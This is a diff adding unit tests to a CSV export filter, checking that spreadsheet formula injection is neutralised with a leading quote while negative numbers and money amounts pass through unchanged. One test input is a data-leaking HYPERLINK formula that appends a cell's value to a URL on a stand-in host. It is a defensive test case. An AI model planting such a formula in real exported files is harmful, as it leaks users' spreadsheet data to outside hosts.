@@ -240,6 +240,39 @@ class FilterTests(TestCase):
         self.assertEqual(filters.csv_row(['x', 1, None, 'y,z']), 'x,1,,"y,z"')
         self.assertEqual(filters.md_cell('a|b\nc'), 'a\\|b c')
 
+    def test_csv_neutralises_formulas(self):
+        '''Text a spreadsheet would run as a formula gets a leading quote (#1004).'''
+        cases = {
+            '=1+1': "'=1+1",
+            '+SUM(A1:A2)': "'+SUM(A1:A2)",
+            '-2+3': "'-2+3",
+            '@SUM(A1)': "'@SUM(A1)",
+            '\t=1+1': "'\t=1+1",
+            '\r=1+1': '"\'\r=1+1"',
+            '=HYPERLINK("https://example.com/?x="&B2,"Click")':
+                '"\'=HYPERLINK(""https://example.com/?x=""&B2,""Click"")"',
+            '-': "'-",
+            '-$': "'-$",
+            '-CHF 25.00': "'-CHF 25.00",
+            '+1 (555) 123-4567': "'+1 (555) 123-4567",
+        }
+        for value, cell in cases.items():
+            with self.subTest(value=value):
+                self.assertEqual(filters.csv_cell(value), cell)
+        self.assertEqual(filters.csv_row(['Ann', '=1+1']), "Ann,'=1+1")
+        self.assertEqual(filters.csv_cell('a=b'), 'a=b')
+
+    def test_csv_leaves_numbers_alone(self):
+        '''Negative numbers and `money` amounts (a refund is "-$25.00") stay numbers.'''
+        for value in [-25, '-25', '-25.00', Decimal('-25.00'), -2.5, '+25', '-.5', '-1e5',
+                      '-€25.00', filters.money(-25), filters.money(-25, symbol='£')]:
+            with self.subTest(value=value):
+                self.assertEqual(filters.csv_cell(value), str(value))
+        self.assertEqual(filters.csv_cell(filters.money(-25)), '-$25.00')
+        # A thousands comma still needs CSV quoting, but no formula prefix.
+        self.assertEqual(filters.csv_cell(filters.money(-1234.5)), '"-$1,234.50"')
+        self.assertEqual(filters.csv_row(['Refund', filters.money(-25)]), 'Refund,-$25.00')
+
 
 class EventDataTypoTests(TestCase):
     '''Keys an event's own data doesn't define (#994): warned, unlike unanswered ones.'''
